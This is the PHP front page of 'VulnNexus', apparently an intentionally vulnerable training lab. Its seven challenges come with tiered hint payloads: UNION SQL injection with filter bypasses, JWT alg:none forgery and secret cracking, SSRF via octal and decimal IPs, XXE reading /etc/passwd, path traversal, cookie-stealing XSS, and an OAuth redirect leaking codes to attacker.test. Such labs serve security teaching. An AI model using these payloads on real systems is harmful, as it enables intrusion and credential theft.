<?php header('Cache-Control: no-store, max-age=0'); $self = $_SERVER['HTTP_HOST'] ?? 'localhost:8001'; ?><!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>VulnNexus — API Portal</title>
<style>
:root{--bg:#f4f6fb;--card:#fff;--ink:#1b2430;--muted:#5b6b7e;--line:#e3e8f0;--brand:#7a3df0;--brand2:#1f6feb;--ok:#1f9d57}
*{box-sizing:border-box}body{font-family:system-ui,Segoe UI,Arial,sans-serif;background:var(--bg);color:var(--ink);margin:0;line-height:1.5}
.topbar{position:sticky;top:0;z-index:5;background:linear-gradient(120deg,#2a1457,#7a3df0);color:#fff;padding:12px 18px;display:flex;align-items:center;gap:12px;box-shadow:0 2px 8px rgba(30,20,60,.18)}
.brand{font-weight:700;font-size:1.15em}.badge{font-size:.72em;background:rgba(255,255,255,.18);padding:2px 9px;border-radius:20px}
.nav{margin-left:auto;display:flex;gap:8px;flex-wrap:wrap}.nav a{color:#fff;text-decoration:none;font-size:.85em;background:rgba(255,255,255,.12);padding:5px 11px;border-radius:7px}.nav a:hover{background:rgba(255,255,255,.26)}
.wrap{max-width:900px;margin:22px auto;padding:0 16px}
.card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px 18px;margin:14px 0;box-shadow:0 1px 3px rgba(20,40,80,.06)}
.card h2{margin:0 0 8px;font-size:1.02em;color:#2a1457;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
.card h2 code{background:#f0ecfb;color:#5b2bd6;padding:2px 7px;border-radius:5px;font-size:.92em}
.flag-pill{font-size:.7em;font-weight:600;background:#fdebc6;color:#8a5a00;padding:2px 8px;border-radius:20px}
details{margin:6px 0 10px}summary{cursor:pointer;color:var(--brand2);font-size:.9em}
details .pl{display:block;margin:8px 0;background:#0f1622;color:#9ce6a0;padding:8px 10px;border-radius:6px;font-family:ui-monospace,Consolas,monospace;font-size:.85em;white-space:pre-wrap;word-break:break-all}
form{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin:4px 0}
input[type=text],textarea{flex:1;min-width:220px;padding:8px 10px;border:1px solid var(--line);border-radius:7px;font-family:ui-monospace,Consolas,monospace;font-size:.9em}
textarea{min-height:92px;width:100%}
button{background:var(--brand);color:#fff;border:0;border-radius:7px;padding:8px 13px;cursor:pointer;font-size:.88em}
button.ghost{background:#eef2f9;color:var(--brand2)}button:hover{filter:brightness(1.06)}
.levels{display:flex;gap:6px;margin:8px 0;flex-wrap:wrap}.lvlbtn{background:#eef2f9;color:var(--muted);font-size:.8em;padding:4px 11px}.lvlbtn.on{background:#7a3df0;color:#fff}.note{color:var(--muted);font-size:.85em}
.card.chal>.cbody{display:none}.card.chal.open>.cbody{display:block}.card.chal>h2{cursor:pointer}
.card.chal>h2::before{content:"▸ ";opacity:.5;font-weight:400}.card.chal.open>h2::before{content:"▾ "}
.urlprev{color:var(--brand2);font-size:.8em;font-family:ui-monospace,Consolas,monospace;margin:6px 0 0;word-break:break-all;opacity:.9}
.res{width:100%;height:180px;border:1px solid var(--line);border-radius:8px;background:#fff;margin-top:8px;display:block}
.rx{white-space:pre-wrap;background:#0f1622;color:#dfe6ee;border-radius:8px;padding:10px;margin-top:8px;font-family:ui-monospace,Consolas,monospace;font-size:.85em;display:block;max-height:220px;overflow:auto}
.muted{color:var(--muted);font-size:.92em}.ok{border-color:var(--ok);background:#eafaf0}
footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted);font-size:.85em;border-top:1px solid var(--line)}footer a{color:var(--brand2)}
</style></head><body>
<div class="topbar"><span class="brand">⬡ VulnNexus</span><span class="badge">app 2 · medium → hard</span>
<nav class="nav"><a href="index.php">Home</a><a href="progress.php">📊 Progress</a><a href="reset.php" title="drop &amp; reseed the DB">↺ Reset</a><a href="feedback.php">💬 Feedback</a></nav></div>
<div class="wrap">
<?php if(isset($_GET['reset'])) echo "<div class='card ok'>✅ Lab reset to a clean state (DB reseeded).</div>"; ?>

<div class="card"><h2>API endpoints — seven flags to capture 🏁 <span style="float:right;opacity:.5;font-size:.6em;font-weight:400">loaded <?php echo date('H:i:s'); ?></span></h2>
<p class="muted">An API-style target: responses are raw (JSON / text / XML). For each endpoint you see
<b>what</b> it is and the <b>vuln class</b> — work out the payload yourself. Stuck? Click <b>💡 hint</b>,
then <b>“use this”</b> to drop the example into the box and <b>Run</b> (encoding is handled for you).
Full walkthroughs are in <code>SOLUTIONS.md</code>.</p>
<p class="muted">Two ways, same code: this <b>🎯 hub</b> is the guided console; or hit each <b>raw endpoint directly</b>
in the URL (e.g. <code>fetch.php?url=…</code>, <code>search.php?q=…</code>) like a real API client — less pretty, more direct.</p></div>

<!-- 1. SQLi -->
<div class="card"><h2>1 · <code>search.php?q=</code> <span class="flag-pill">🏁 UNION SQLi</span></h2>
  <p class="muted">Product search. The query has 3 columns. Enumerate <code>information_schema</code> → dump
     the <code>secrets</code> table (flag) and the <code>users</code> table (crackable MD5 hashes).</p>
  <div class="levels" id="lv_q"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('q','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('q','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('q','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('q','expert')">Expert</button></div>
  <details><summary>💡 hint — <span class="note" id="note_q"></span></summary><code class="pl" id="pl_q"></code>
    <button type="button" class="ghost" onclick="fill('in_q','pl_q')">use this ▶</button>
    <code class="pl" id="pl_q2">zzz%' UNION SELECT GROUP_CONCAT(username,0x3a,password,0x3a,role SEPARATOR 0x0a),2,3 FROM users-- -</code>
    <button type="button" class="ghost" onclick="fill('in_q','pl_q2')">dump users (easy) ▶</button></details>
  <form method="get" action="search.php" target="r_q" onsubmit="show('r_q')">
    <input type="hidden" name="level" id="lvl_q" value="easy">
    <input type="text" id="in_q" name="q" placeholder="type your SQLi payload…"><button>Run ▶</button></form>
  <iframe name="r_q" id="r_q" class="res"></iframe></div>

<!-- 2. JWT -->
<div class="card"><h2>2 · <code>login.php</code> → <code>account.php</code> <span class="flag-pill">🏁 JWT forgery</span></h2>
  <p class="muted">Log in to get a <code>session</code> JWT, then make yourself <code>role=admin</code>
     (<b>alg:none</b> or crack the weak HS256 secret). Edit the cookie in DevTools / jwt.io, then open account.</p>
  <div class="levels" id="lv_jwt"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('jwt','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('jwt','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('jwt','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('jwt','expert')">Expert</button></div>
  <details><summary>💡 hint — <span class="note" id="note_jwt"></span></summary><code class="pl" id="pl_jwt"></code></details>
  <form method="post" action="login.php" target="r_jwt" onsubmit="show('r_jwt')">
    <input type="hidden" name="level" id="lvl_jwt" value="easy">
    <input type="text" id="in_u" name="username" placeholder="username" style="min-width:120px">
    <input type="text" id="in_p" name="password" placeholder="password" style="min-width:120px">
    <button type="button" class="ghost" onclick="document.getElementById('in_u').value='alice';document.getElementById('in_p').value='alice123'">fill alice ▶</button>
    <button>Login ▶</button></form>
  <form method="get" action="account.php" target="r_jwt" onsubmit="show('r_jwt')" style="margin-top:0"><input type="hidden" name="level" id="lvl_jwt2" value="easy"><button class="ghost">open account.php ▶</button></form>
  <iframe name="r_jwt" id="r_jwt" class="res"></iframe></div>

<!-- 3. SSRF -->
<div class="card"><h2>3 · <code>fetch.php?url=</code> <span class="flag-pill">🏁 SSRF</span></h2>
  <p class="muted">Server-side URL fetcher — no allow-list. Reach an internal service or a local file.</p>
  <div class="levels" id="lv_url"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('url','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('url','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('url','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('url','expert')">Expert</button></div>
  <details><summary>💡 hint — <span class="note" id="note_url"></span></summary><code class="pl" id="pl_url"></code>
    <button type="button" class="ghost" onclick="fill('in_url','pl_url')">use this ▶</button></details>
  <form method="get" action="fetch.php" target="r_url" onsubmit="show('r_url')">
    <input type="hidden" name="level" id="lvl_url" value="easy">
    <input type="text" id="in_url" name="url" placeholder="a URL the server will fetch…"><button>Run ▶</button></form>
  <iframe name="r_url" id="r_url" class="res"></iframe></div>

<!-- 4. XXE -->
<div class="card"><h2>4 · <code>import.php</code> (POST XML) <span class="flag-pill">🏁 XXE</span></h2>
  <p class="muted">Imports an XML order. External entities are resolved → read local files. <i>(needs <code>php-xml</code>)</i></p>
  <div class="levels" id="lv_xml"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('xml','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('xml','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('xml','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('xml','expert')">Expert</button></div>
  <input type="hidden" id="lvl_xml" value="easy">
  <details><summary>💡 hint — <span class="note" id="note_xml"></span></summary><code class="pl" id="pl_xml"></code>
    <button type="button" class="ghost" onclick="fill('in_xml','pl_xml')">use this ▶</button></details>
  <textarea id="in_xml" placeholder="paste an XML document…"></textarea>
  <div><button type="button" onclick="sendXml()">Send XML ▶</button></div>
  <pre id="r_xml" class="rx"></pre></div>

<!-- 5. Path traversal -->
<div class="card"><h2>5 · <code>download.php?file=</code> <span class="flag-pill">🏁 path traversal</span></h2>
  <p class="muted">Downloads a file from <code>docs/</code>. Escape it with <code>../</code>.</p>
  <div class="levels" id="lv_file"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('file','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('file','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('file','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('file','expert')">Expert</button></div>
  <details><summary>💡 hint — <span class="note" id="note_file"></span></summary><code class="pl" id="pl_file"></code>
    <button type="button" class="ghost" onclick="fill('in_file','pl_file')">use this ▶</button></details>
  <form method="get" action="download.php" target="r_file" onsubmit="show('r_file')">
    <input type="hidden" name="level" id="lvl_file" value="easy">
    <input type="text" id="in_file" name="file" placeholder="a file path…"><button>Run ▶</button></form>
  <iframe name="r_file" id="r_file" class="res"></iframe></div>

<!-- 6. Filtered XSS -->
<div class="card"><h2>6 · <code>greet.php?name=</code> <span class="flag-pill">🏁 filtered XSS</span></h2>
  <p class="muted">Greeting with a naive filter that strips <code>&lt;script&gt;</code> once. Bypass it; the page sets a non-HttpOnly <code>flag</code> cookie.</p>
  <div class="levels" id="lv_name"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('name','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('name','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('name','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('name','expert')">Expert</button></div>
  <details><summary>💡 hint — <span class="note" id="note_name"></span></summary><code class="pl" id="pl_name"></code>
    <button type="button" class="ghost" onclick="fill('in_name','pl_name')">use this ▶</button></details>
  <form method="get" action="greet.php" target="r_name" onsubmit="show('r_name')">
    <input type="hidden" name="level" id="lvl_name" value="easy">
    <input type="text" id="in_name" name="name" placeholder="your XSS payload…"><button>Run ▶</button></form>
  <iframe name="r_name" id="r_name" class="res"></iframe></div>

<!-- 7. OAuth -->
<div class="card"><h2>7 · <code>oauth_authorize.php?redirect_uri=</code> <span class="flag-pill">🏁 OAuth</span></h2>
  <p class="muted">OAuth authorize endpoint. The <code>redirect_uri</code> isn't validated, so the victim's
     auth <code>code</code> can be sent to a host you control → replay it at <code>oauth_callback.php?code=</code>.</p>
  <div class="levels" id="lv_rd"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('rd','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('rd','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('rd','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('rd','expert')">Expert</button></div>
  <details><summary>💡 hint — <span class="note" id="note_rd"></span></summary><code class="pl" id="pl_rd"></code>
    <button type="button" class="ghost" onclick="fill('in_rd','pl_rd')">use this ▶</button>
    <span class="muted"> · the issued <code>code=</code> (in the redirect) is bound to “admin” → replay at <code>oauth_callback.php?code=</code></span></details>
  <form method="get" action="oauth_authorize.php" target="r_rd" onsubmit="show('r_rd')">
    <input type="hidden" name="level" id="lvl_rd" value="easy">
    <input type="text" id="in_rd" name="redirect_uri" placeholder="redirect_uri…"><button>Run ▶</button></form>
  <iframe name="r_rd" id="r_rd" class="res"></iframe></div>

</div>
<footer>⚠️ <b>Intentionally vulnerable — training only.</b> Run locally / isolated lab; never expose it. ·
<a href="feedback.php">Report a bug / idea</a> · walkthroughs in <code>SOLUTIONS.md</code></footer>
<script>
function fill(inputId, plId){ var i=document.getElementById(inputId); i.value=document.getElementById(plId).textContent; i.dispatchEvent(new Event('input')); }
function show(frameId){ document.getElementById(frameId).style.display='block'; }
const PAYLOADS={
 q:{easy:{p:"zzz%' UNION SELECT k,v,3 FROM secrets-- -",n:"Easy — raw UNION."},medium:{p:"zzz%' UNIunionON SELselectECT k,v,3 FROM secrets-- -",n:"Medium — union/select stripped once → nest (UNIunionON)."},hard:{p:"zzz%'/**/UNIunionON/**/SELselectECT/**/k,v,3/**/FROM/**/secrets#",n:"Hard — + spaces stripped → /**/ and end with #."},expert:{p:"zzz' OR 1=1-- -",n:"Expert — BLIND (match/no match). Boolean-extract the flag char by char."}},
 url:{easy:{p:"http://127.0.0.1:8001/metadata.php",n:"Easy — no filter."},medium:{p:"http://127.1:8001/metadata.php",n:"Medium — 127.0.0.1/localhost blocked → 127.1 (or decimal/octal)."},hard:{p:"http://2130706433:8001/metadata.php",n:"Hard — 127. and 0.0.0.0 blocked → decimal IP 2130706433 (or hex/octal)."},expert:{p:"http://0177.0.0.1:8001/metadata.php",n:"Expert — decimal/hex/file:// blocked → octal 0177.0.0.1."}},
 file:{easy:{p:"../private2/secret_config.txt",n:"Easy — raw ../."},medium:{p:"....//private2/secret_config.txt",n:"Medium — ../ stripped once → ....// (one is enough; docs/ is one level deep)."},hard:{p:"....//private2/secret_config.txt",n:"Hard — + must end .txt/.conf/.md (it does)."},expert:{p:"php://filter/convert.base64-encode/resource=private2/secret_config.txt",n:"Expert — traversal blocked → php://filter wrapper, then base64-decode."}},
 name:{easy:{p:"<script>alert(document.cookie)<\/script>",n:"Easy — raw."},medium:{p:"<img src=x onerror=alert(document.cookie)>",n:"Medium — <script stripped → <img onerror>."},hard:{p:"<svg onload=alert(document.cookie)>",n:"Hard — onerror stripped → <svg onload>."},expert:{p:"<svg><animate onbegin=alert(document.cookie) attributeName=x dur=1s>",n:"Expert — onload stripped → <svg><animate onbegin>."}}
};
PAYLOADS.jwt={
 easy:{p:"Forge a token: header {\"alg\":\"none\"}, payload {\"user\":\"alice\",\"role\":\"admin\"}, empty signature (keep the trailing dot). Set it as the 'session' cookie, then open account.php.",n:"Easy — alg:none is accepted."},
 medium:{p:"alg:none is rejected. Crack the HS256 secret: hashcat -m 16500 token.txt rockyou.txt -> 'secret'. Re-sign role=admin on jwt.io with it.",n:"Medium — crack the weak secret ('secret')."},
 hard:{p:"Tougher secret, still in rockyou -> crack it -> 'superman'. Re-sign role=admin.",n:"Hard — crack a stronger secret ('superman')."},
 expert:{p:"Secret is strong & uncrackable -- but it is in the DB. SQLi-dump secrets where k='jwt_sign_secret', then sign role=admin with that secret.",n:"Expert — secret leaked via SQLi (SQLi -> JWT chain)."}
};
var _ready=false;
function setLvl(card,lvl){
  var Ld=document.getElementById('lvl_'+card); if(Ld) Ld.value=lvl;
  var L2=document.getElementById('lvl_'+card+'2'); if(L2) L2.value=lvl;
  var d=PAYLOADS[card][lvl];
  var pl=document.getElementById('pl_'+card); if(pl) pl.textContent=d.p;
  var nt=document.getElementById('note_'+card); if(nt) nt.textContent=d.n;
  var _inp=document.getElementById('in_'+card); if(_ready && _inp && card!=='up'){ _inp.value=d.p; try{_inp.dispatchEvent(new Event('input'));}catch(e){} }
  document.querySelectorAll('#lv_'+card+' .lvlbtn').forEach(function(b){ b.classList.toggle('on', b.getAttribute('data-l')===lvl); });
}
PAYLOADS.rd={
 easy:{p:"http://attacker.test/cb",n:"Easy — no validation; any host."},
 medium:{p:"http://localhost@attacker.test/cb",n:"Medium — must start with http://localhost → @ userinfo trick (real host = attacker.test)."},
 hard:{p:"http://localhost.attacker.test/cb",n:"Hard — '@' blocked → subdomain trick (host = localhost.attacker.test)."},
 expert:{p:"http://localhost.attacker.test/cb",n:"Expert — host-shape check; same subdomain works (real world: a parser differential)."}
};
PAYLOADS.xml={
 easy:{p:'<\x3Fxml version="1.0"?\x3E\n<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>\n<order><item>&e;</item></order>',n:"Easy — SYSTEM + file:// (needs php-xml installed)."},
 medium:{p:'<\x3Fxml version="1.0"?\x3E\n<!DOCTYPE x [<!ENTITY e PUBLIC "x" "file:///etc/passwd">]>\n<order><item>&e;</item></order>',n:"Medium — 'SYSTEM' blocked → use PUBLIC."},
 hard:{p:'<\x3Fxml version="1.0"?\x3E\n<!DOCTYPE x [<!ENTITY e PUBLIC "x" "php://filter/convert.base64-encode/resource=/etc/passwd">]>\n<order><item>&e;</item></order>',n:"Hard — file:// blocked → php://filter, then base64-decode."},
 expert:{p:'(advanced) inline <!ENTITY is blocked → use an external DTD or parameter entities.',n:"Expert — inline entities blocked → external/parameter-entity DTD (advanced)."}
};
['q','url','file','name','jwt','rd','xml'].forEach(function(c){ setLvl(c,'easy'); });
_ready=true;
// Accordion: collapse every challenge card; click a title to open it (closes the others).
document.querySelectorAll('.wrap > .card').forEach(function(card){
  var h=card.querySelector('h2'); if(!h) return;
  if(!card.querySelector('form, .levels, textarea')) return;   // skip the intro card
  card.classList.add('chal');
  var body=document.createElement('div'); body.className='cbody';
  while(h.nextSibling){ body.appendChild(h.nextSibling); }
  card.appendChild(body);
  h.addEventListener('click',function(){
    var open=card.classList.contains('open');
    document.querySelectorAll('.card.chal.open').forEach(function(c){ c.classList.remove('open'); });
    if(!open) card.classList.add('open');
  });
});
var first=document.querySelector('.card.chal'); if(first) first.classList.add('open');  // open the first
// Live URL preview under each GET form input (shows WHERE the payload goes).
document.querySelectorAll('form').forEach(function(f){
  var named=[]; f.querySelectorAll('input[type="text"],textarea').forEach(function(i){ if(i.name) named.push(i); });
  if(!named.length) return;
  var method=(f.getAttribute('method')||'get').toUpperCase();
  var act=(f.getAttribute('action')||'').split('?')[0]||'(this page)';
  var pv=document.createElement('div'); pv.className='urlprev'; f.appendChild(pv);
  function upd(){ var qs=named.map(function(i){return i.name+'='+i.value;}).join('&');
    pv.textContent=(method==='GET')?('→ GET '+act+'?'+qs):('→ POST '+act+'   body: '+qs); }
  named.forEach(function(i){ i.addEventListener('input',upd); }); upd();
});
function sendXml(){
  var out=document.getElementById('r_xml'); out.style.display='block'; out.textContent='sending…';
  fetch('import.php?level='+((document.getElementById('lvl_xml')||{}).value||'easy'),{method:'POST',headers:{'Content-Type':'application/xml'},body:document.getElementById('in_xml').value})
    .then(r=>r.text()).then(t=>out.textContent=t).catch(e=>out.textContent='error: '+e);
}
</script>
</body></html>
